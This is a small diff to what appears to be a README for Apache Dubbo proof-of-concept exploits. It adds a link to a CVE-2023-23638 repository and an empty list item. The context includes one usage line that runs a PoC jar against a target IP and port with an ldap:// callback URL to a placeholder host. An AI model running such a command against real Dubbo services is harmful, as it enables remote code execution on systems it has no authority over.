@@ -28,3 +28,5 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - https://github.com/Firebasky/Java/tree/main/Dubbo
 - [谁在使用 Dubbo](https://github.com/apache/dubbo/issues/1012)
 - [谁在使用 Dubbo3](https://github.com/apache/dubbo/issues/9436)
+- https://github.com/X1r0z/CVE-2023-23638
+- 
